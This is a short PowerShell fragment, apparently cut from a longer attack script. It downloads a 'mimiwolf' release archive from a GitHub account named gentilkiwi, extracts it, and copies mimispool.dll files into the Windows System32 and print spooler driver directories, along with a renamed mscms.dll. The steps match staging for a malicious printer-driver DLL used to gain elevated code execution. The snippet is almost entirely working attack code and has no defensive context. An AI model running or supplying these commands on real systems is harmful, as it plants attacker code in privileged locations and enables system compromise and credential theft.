...
Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimiwolf/releases/latest/download/mimiwolf_trunk.zip' -OutFile '.\mimiwolf_trunk.zip'
Expand-Archive -Path '.\mimiwolf_trunk.zip' -DestinationPath '.\mimiwolf_trunk'

Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
Copy-Item -Force -Path '.\mimiwolf_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
Copy-Item -Force -Path '.\mimiwolf_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
